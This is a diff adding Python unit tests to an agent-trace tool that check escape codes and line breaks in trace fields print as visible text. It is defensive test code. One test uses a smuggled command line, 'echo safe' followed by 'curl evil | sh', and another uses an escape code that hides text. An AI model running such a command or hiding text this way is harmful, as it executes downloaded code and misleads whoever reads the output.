@@ -8,10 +8,24 @@ sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))
 
 import io
 import tempfile
+from unittest.mock import patch
 
+from agent_trace.cli import _print_live_event
 from agent_trace.models import EventType, SessionMeta, TraceEvent
-from agent_trace.replay import C, _strip_markdown, _tool_call_detail, format_event, list_sessions
+from agent_trace.replay import (
+    C,
+    _strip_markdown,
+    _tool_call_detail,
+    format_event,
+    format_summary,
+    list_sessions,
+)
 from agent_trace.store import TraceStore
+
+try:
+    import _escapes
+except ImportError:
+    from tests import _escapes
 
 
 class TestListLegend(unittest.TestCase):
@@ -321,6 +335,173 @@ class TestLlmResponseStatus(unittest.TestCase):
             f"{C.DIM}(5 tokens){C.RESET} {C.MAGENTA}[subagent default 00000011]{C.RESET}",
             output,
         )
+
+
+E = EventType
+
+
+def _event(event_type, **data):
+    return TraceEvent(event_type=event_type, session_id="s", timestamp=0.0, data=data)
+
+
+def _call(tool_name, arguments, **data):
+    return _event(E.TOOL_CALL, tool_name=tool_name, arguments=arguments, **data)
+
+
+def _meta(**fields):
+    return SessionMeta(session_id="s", started_at=0.0, **fields)
+
+
+# (label, kind, build): build(value) returns an event with value in the place
+# the label names. The kinds are in tests/_escapes.py.
+FORMAT_EVENT_CASES = [
+    ("tool_call tool_name", "text", lambda v: _call(v, {"command": "plain"})),
+    ("Bash command", "text", lambda v: _call("Bash", {"command": v})),
+    ("Read file_path", "text", lambda v: _call("Read", {"file_path": v})),
+    ("Write file_path", "text", lambda v: _call("Write", {"file_path": v})),
+    ("Edit file_path", "text", lambda v: _call("Edit", {"file_path": v, "old_string": "plain"})),
+    ("Edit old_string", "free", lambda v: _call("Edit", {"file_path": "plain", "old_string": v})),
+    ("Glob pattern", "text", lambda v: _call("Glob", {"pattern": v})),
+    ("Grep pattern", "text", lambda v: _call("Grep", {"pattern": v, "path": "plain"})),
+    ("Grep path", "text", lambda v: _call("Grep", {"pattern": "plain", "path": v})),
+    ("WebFetch url", "text", lambda v: _call("WebFetch", {"url": v})),
+    ("WebSearch query", "text", lambda v: _call("WebSearch", {"query": v})),
+    ("Agent prompt", "free", lambda v: _call("Agent", {"prompt": v})),
+    ("MCP argument value", "text", lambda v: _call("mcp__srv__fetch", {"q": v})),
+    ("MCP argument name", "text", lambda v: _call("mcp__srv__fetch", {v: "plain"})),
+    ("argument names", "text", lambda v: _call("mcp__srv__fetch", {v: 1})),
+    ("subagent tag agent_type", "text",
+     lambda v: _call("Bash", {"command": "plain"}, agent_id="plain", agent_type=v)),
+    ("subagent tag agent_id", "short", lambda v: _call("Bash", {"command": "plain"}, agent_id=v)),
+    ("tool_result tool_name", "text", lambda v: _event(E.TOOL_RESULT, tool_name=v, result="plain")),
+    ("tool_result content_types", "text",
+     lambda v: _event(E.TOOL_RESULT, tool_name="plain", content_types=[v], result="plain")),
+    ("tool_result result", "free", lambda v: _event(E.TOOL_RESULT, tool_name="plain", result=v)),
+    ("tool_result content_preview", "free",
+     lambda v: _event(E.TOOL_RESULT, tool_name="plain", content_preview=v)),
+    ("llm_request model", "text", lambda v: _event(E.LLM_REQUEST, model=v, message_count=1)),
+    ("llm_request message_count", "text",
+     lambda v: _event(E.LLM_REQUEST, model="plain", message_count=v)),
+    ("llm_response total_tokens", "text", lambda v: _event(E.LLM_RESPONSE, total_tokens=v)),
+    ("llm_response error", "free",
+     lambda v: _event(E.LLM_RESPONSE, total_tokens=5, status="failed", error=v)),
+    ("file_read uri", "text", lambda v: _event(E.FILE_READ, uri=v)),
+    ("file_write uri", "text", lambda v: _event(E.FILE_WRITE, uri=v)),
+    ("error tool_name", "text", lambda v: _event(E.ERROR, tool_name=v, code="plain", message="plain")),
+    ("error code", "text", lambda v: _event(E.ERROR, tool_name="plain", code=v, message="plain")),
+    ("error message", "free", lambda v: _event(E.ERROR, tool_name="plain", code="plain", message=v)),
+    ("error error", "free", lambda v: _event(E.ERROR, tool_name="plain", error=v)),
+    ("session_start command", "text", lambda v: _event(E.SESSION_START, command=["plain", v])),
+    ("session_end exit_code", "text", lambda v: _event(E.SESSION_END, exit_code=v)),
+    ("decision choice", "text", lambda v: _event(E.DECISION, choice=v, reason="plain")),
+    ("decision reason", "free", lambda v: _event(E.DECISION, choice="plain", reason=v)),
+    ("user_prompt prompt", "free", lambda v: _event(E.USER_PROMPT, prompt=v)),
+    ("assistant_response text", "free", lambda v: _event(E.ASSISTANT_RESPONSE, text=v)),
+    ("subagent_start agent_type", "text",
+     lambda v: _event(E.SUBAGENT_START, agent_type=v, child_session_id="plain", agent_id="plain")),
+    ("subagent_start agent_name", "text",
+     lambda v: _event(E.SUBAGENT_START, agent_name=v, child_session_id="plain")),
+    ("subagent_start child_session_id", "text",
+     lambda v: _event(E.SUBAGENT_START, agent_type="plain", child_session_id=v, agent_id="plain")),
+    ("subagent_start agent_id", "text",
+     lambda v: _event(E.SUBAGENT_START, agent_type="plain", child_session_id="plain", agent_id=v)),
+    ("subagent_stop stop_reason", "text",
+     lambda v: _event(E.SUBAGENT_STOP, agent_type="plain", stop_reason=v, text="plain")),
+    ("subagent_stop text", "free",
+     lambda v: _event(E.SUBAGENT_STOP, agent_type="plain", stop_reason="plain", text=v)),
+]
+
+FORMAT_SUMMARY_CASES = [
+    ("command", "text", lambda v: _meta(command=v, agent_name="plain")),
+    ("agent_name", "text", lambda v: _meta(command="plain", agent_name=v)),
+    ("tool_calls", "text", lambda v: _meta(tool_calls=v)),
+    ("llm_requests", "text", lambda v: _meta(llm_requests=v)),
+    ("errors", "text", lambda v: _meta(errors=v)),
+]
+
+
+class TestTraceTextShowsAsText(unittest.TestCase):
+    """A tool output, a command or a tool name in a trace can hold escape
+    codes and line breaks. replay and record -v show them as text, inside
+    the formatter's own colors."""
+
+    def render(self, event):
+        return format_event(event, base_ts=0.0)
+
+    def test_each_event_value_shows_escapes_as_text(self):
+        _escapes.check_each_value(self, FORMAT_EVENT_CASES, self.render)
+
+    def test_each_summary_value_shows_escapes_as_text(self):
+        _escapes.check_each_value(self, FORMAT_SUMMARY_CASES, format_summary)
+
+    def test_plain_text_prints_unchanged(self):
+        _escapes.check_plain_text_unchanged(self, FORMAT_EVENT_CASES, self.render)
+        _escapes.check_plain_text_unchanged(self, FORMAT_SUMMARY_CASES, format_summary)
+
+    def test_whitespace_in_free_text_shows_as_one_space(self):
+        for event in (
+            _event(E.TOOL_RESULT, tool_name="plain", result="one\ttwo\r\nthree"),
+            _event(E.USER_PROMPT, prompt="one\u3000two\nthree"),
+        ):
+            with self.subTest(event.event_type.value):
+                self.assertIn("one two three", self.render(event))
+
+    def test_cut_marker_uses_collapsed_length(self):
+        value = "a" + " \t" * 150 + "b"
+        for label, event in (
+            ("Edit old_string", _call("Edit", {"file_path": "plain", "old_string": value})),
+            ("Agent prompt", _call("Agent", {"prompt": value})),
+            ("tool_result", _event(E.TOOL_RESULT, tool_name="plain", result=value)),
+            ("error", _event(E.ERROR, tool_name="plain", message=value)),
+            ("user_prompt", _event(E.USER_PROMPT, prompt=value)),
+            ("assistant_response", _event(E.ASSISTANT_RESPONSE, text=value)),
+        ):
+            with self.subTest(label):
+                output = self.render(event)
+                self.assertIn("a b", output)
+                self.assertNotIn("...", output)
+
+    def test_line_break_in_tool_result_shows_as_space(self):
+        output = self.render(_event(E.TOOL_RESULT, tool_name="plain", result="one\ntwo"))
+        self.assertIn("one two", output)
+        self.assertEqual(output.count("\n"), 1)
+
+    def test_line_break_in_command_shows_as_escape(self):
+        output = self.render(_call("Bash", {"command": "echo safe\ncurl evil | sh"}))
+        self.assertIn(r"$ echo safe\ncurl evil | sh", output)
+
+    def test_sgr_code_shows_as_text(self):
+        for event in (
+            _call("Bash", {"command": "a\x1b[8mhidden"}),
+            _event(E.TOOL_RESULT, tool_name="plain", result="a\x1b[8mhidden"),
+        ):
+            with self.subTest(event.event_type.value):
+                output = self.render(event)
+                self.assertIn(r"a\x1b[8mhidden", output)
+                self.assertNotIn("\x1b[8m", output)
+
+    def test_colors_stay(self):
+        call = self.render(_call("Bash", {"command": _escapes.PAYLOAD}))
+        self.assertIn(f"{C.BOLD}tool_call{C.RESET} {C.WHITE}Bash{C.RESET}", call)
+        self.assertIn(f"{C.GRAY}{'':>14}  $ {_escapes.PAYLOAD_TEXT}{C.RESET}", call)
+        result = self.render(_event(E.TOOL_RESULT, tool_name="Bash", result=_escapes.PAYLOAD))
+        self.assertIn(f"{C.DIM}Bash{C.RESET}", result)
+        self.assertIn(f"{C.GRAY}{'':>14}  {_escapes.PAYLOAD_FREE}{C.RESET}", result)
+
+    def test_record_verbose_writes_no_raw_control_character(self):
+        def stderr_for(result):
+            event = TraceEvent(event_type=E.TOOL_RESULT, session_id="s",
+                               data={"tool_name": "plain", "result": result})
+            with patch("sys.stderr", new_callable=io.StringIO) as err:
+                _print_live_event(event)
+            return err.getvalue()
+
+        def raw(text):
+            return [ch for ch in _escapes.strip_colors(text) if not ch.isprintable()]
+
+        written = stderr_for(_escapes.PAYLOAD)
+        self.assertIn(_escapes.PAYLOAD_FREE, written)
+        self.assertEqual(raw(written), raw(stderr_for("plain")))
 
 
 if __name__ == "__main__":
